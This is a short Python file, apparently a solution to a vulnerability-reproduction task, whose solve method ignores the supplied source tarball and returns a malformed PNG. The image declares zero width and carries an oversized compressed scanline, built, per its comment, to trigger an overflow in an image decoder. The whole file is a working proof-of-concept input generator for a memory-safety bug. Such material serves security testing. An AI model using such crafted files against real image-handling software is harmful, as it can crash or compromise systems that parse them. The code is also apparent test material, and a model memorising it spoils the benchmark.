import struct, zlib, binascii, tarfile

class Solution:
    def _make_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        return (
            struct.pack(">I", len(data)) +
            chunk_type +
            data +
            struct.pack(">I", binascii.crc32(chunk_type + data) & 0xFFFFFFFF)
        )

    def _generate_png_zero_width(self) -> bytes:
        signature = b"\x89PNG\r\n\x1a\n"
        width = 0
        height = 1
        ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
        ihdr_chunk = self._make_chunk(b'IHDR', ihdr_data)

        # Create oversized row data to exacerbate potential overflow
        raw_scanline = b'\x00' + b'\x00' * 1024
        idat_data = zlib.compress(raw_scanline)
        idat_chunk = self._make_chunk(b'IDAT', idat_data)

        iend_chunk = self._make_chunk(b'IEND', b'')
        return signature + ihdr_chunk + idat_chunk + iend_chunk

    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as t:
                files = set(member.name.lower() for member in t.getmembers())
        except Exception:
            files = set()

        # Currently only one PoC generator is provided; selector kept for potential extension
        return self._generate_png_zero_width()
